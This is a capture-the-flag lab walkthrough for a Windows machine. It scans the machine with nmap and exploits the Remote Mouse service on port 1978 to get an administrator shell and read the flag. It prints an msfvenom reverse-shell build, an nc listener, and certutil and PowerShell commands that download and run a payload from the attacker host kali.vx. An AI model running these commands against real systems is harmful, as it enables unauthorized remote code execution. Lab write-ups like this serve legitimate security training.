# 0. Sources

|||
|---|---|
|[YouTube](https://www.youtube.com/watch?v=unDGYDe1ljw)|[Download](https://drive.google.com/file/d/1uTJDtFDX9WkhUt-HEuZ5iNS-3CmHMP0m/view)|

# 1. nmap scan

```console
┌──(root㉿kali)-[~]
└─$ nmap -p- -A 10.0.88.34
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-27 08:15 +08
Nmap scan report for 10.0.88.34
Host is up (0.0012s latency).
Not shown: 65515 closed tcp ports (conn-refused)
PORT      STATE SERVICE        VERSION
21/tcp    open  ftp            FileZilla ftpd 0.9.41 beta
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x 1 ftp ftp              0 Sep 14  2021 AccountPictures
| drwxr-xr-x 1 ftp ftp              0 Oct 01  2021 Desktop
| -r--r--r-- 1 ftp ftp            174 Jul 16  2016 desktop.ini
| drwxr-xr-x 1 ftp ftp              0 Sep 14  2021 Documents
| drwxr-xr-x 1 ftp ftp              0 Jul 16  2016 Downloads
| drwxr-xr-x 1 ftp ftp              0 Oct 01  2021 FTP
| drwxr-xr-x 1 ftp ftp              0 Jul 16  2016 Libraries
| drwxr-xr-x 1 ftp ftp              0 Jul 16  2016 Music
| drwxr-xr-x 1 ftp ftp              0 Jul 16  2016 Pictures
|_drwxr-xr-x 1 ftp ftp              0 Jul 16  2016 Videos
80/tcp    open  http           Apache httpd 2.4.17 ((Win32) OpenSSL/1.0.2d PHP/5.6.14)
| http-title: Welcome to XAMPP
|_Requested resource was http://10.0.88.34/dashboard/
|_http-server-header: Apache/2.4.17 (Win32) OpenSSL/1.0.2d PHP/5.6.14
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
443/tcp   open  ssl/http       Apache httpd 2.4.17 ((Win32) OpenSSL/1.0.2d PHP/5.6.14)
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.17 (Win32) OpenSSL/1.0.2d PHP/5.6.14
| http-title: Welcome to XAMPP
|_Requested resource was https://10.0.88.34/dashboard/
445/tcp   open  microsoft-ds   Windows 10 Pro 14393 microsoft-ds (workgroup: ITSL)
1978/tcp  open  unisql?
| fingerprint-strings:
|   DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, ms-sql-s:
|_    SIN 15win nop nop 300
1979/tcp  open  unisql-java?
1980/tcp  open  pearldoc-xact?
3306/tcp  open  mysql          MariaDB (unauthorized)
3389/tcp  open  ms-wbt-server  Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: MOUSEKATOOL2
|   NetBIOS_Domain_Name: MOUSEKATOOL2
|   NetBIOS_Computer_Name: MOUSEKATOOL2
|   DNS_Domain_Name: mousekatool2
|   DNS_Computer_Name: mousekatool2
|   Product_Version: 10.0.14393
|_  System_Time: 2022-11-27T00:17:50+00:00
| ssl-cert: Subject: commonName=mousekatool2
| Not valid before: 2022-11-26T15:13:31
|_Not valid after:  2023-05-28T15:13:31
|_ssl-date: 2022-11-27T00:18:18+00:00; 0s from scanner time.
5357/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8021/tcp  open  ftp-proxy?
| fingerprint-strings:
|   NULL:
|     Content-Type: text/rude-rejection
|     Content-Length: 24
|     Access Denied, go away.
|     Content-Type: text/disconnect-notice
|     Content-Length: 67
|     Disconnected, goodbye.
|_    ClueCon! http://www.cluecon.com/
49664/tcp open  msrpc          Microsoft Windows RPC
49665/tcp open  msrpc          Microsoft Windows RPC
49666/tcp open  msrpc          Microsoft Windows RPC
49667/tcp open  msrpc          Microsoft Windows RPC
49668/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  msrpc          Microsoft Windows RPC
49683/tcp open  msrpc          Microsoft Windows RPC
⋮
```

# 2. Checking for exploits

At first look, it appears that `21/ftp`, `80/http` and `443/https` are easy targets.

However, enumerating the FTP didn't return any useful data, and there doesn't seem to be any exploits usable on the XAMPP stack.

All looks lost: it doesn't seem like there are any other exploits available, and the unknown ports 1978, 1979 and 1980 appear to point to unisql, unisql-java and peardoc-xact when you google for the port numbers.

☝️ **Important learning point from this box:**
- Be sure to check out the banner information (if any) returned from the scan
- Port 1978 returned a gibberish banner `SIN 15win nop nop 300`, which upon googling, leads you to the [Remote Mouse exploit](https://www.exploit-db.com/raw/46697)
- Another method is to google for `1978 site:www.exploit-db.com`, which will also return the Remote Mouse exploit as a result

The 46697.py expolits Remote Mouse to launch `calc.exe`; the line `SendString("calc.exe",ip)` can be modified to run other commands.

# 3. Getting a shell

Generate reverse shell executable and place in web server root:

(Apache2 is already running with DocumentRoot at `/var/www/html`)

```console
┌──(root㉿kali)-[~]
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o /var/www/html/reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: /var/www/html/reverse.exe
```

Open another console window on Kali to listen for connections:

```console
┌──(root㉿kali)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
```

Modify the exploit to download and run the payload

**Option 1:** using Command Prompt

```console
SendString("cmd /c "certutil.exe /urlcache /f /split http://kali.vx/reverse.exe && .\\reverse.exe"",ip)
```

**Option 2:** using PowerShell

```console
SendString("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/reverse.exe','reverse.exe'); Start-Process reverse.exe",ip)
```

Run the exploit

```console
┌──(root㉿kali)-[~]
└─$ python2 46697.py 10.0.88.34
('SUCCESS! Process calc.exe has run on target', '10.0.88.34')
```

Verify that the reverse shell has hooked on from the listener console

```cmd
connect to [192.168.17.10] from (UNKNOWN) [10.0.88.34] 49881
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
mousekatool2\mickey

C:\Windows\system32>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

Excellent, we now have shell on the target, and the user is member of `BUILTIN\Administrators`

# 4. Getting the proof

Since we know that the proof is a file on the user's desktop, let's get straight to it

```cmd
C:\Windows\system32>cd %USERPROFILE%
cd %USERPROFILE%

C:\Users\Mickey>dir /s *flag.txt*
dir /s *flag.txt*
 Volume in drive C has no label.
 Volume Serial Number is DA18-B95C

 Directory of C:\Users\Mickey\AppData\Roaming\Microsoft\Windows\Recent

10/01/2021  01:55 PM               554 flag.txt.lnk
               1 File(s)            554 bytes

 Directory of C:\Users\Mickey\Desktop

10/01/2021  01:56 PM               345 flag.txt.txt
               1 File(s)            345 bytes

     Total Files Listed:
               2 File(s)            899 bytes
               0 Dir(s)  40,675,540,992 bytes free

C:\Users\Mickey>type Desktop\flag.txt.txt
type Desktop\flag.txt.txt
What we have learned:
1) ALWAYS check ftp with anonymous
2)check every running ports, BANNERS, BANNERS can have good info!
3)Look for public exploits
4)Know how to read public exploits
5) If one way fails, try another way

CONGRATS ON ROOTING THE BOX

Try the next one from ITSL
https://www.youtube.com/channel/UCXPdZsu8g1nKerd-o5A75vA
```
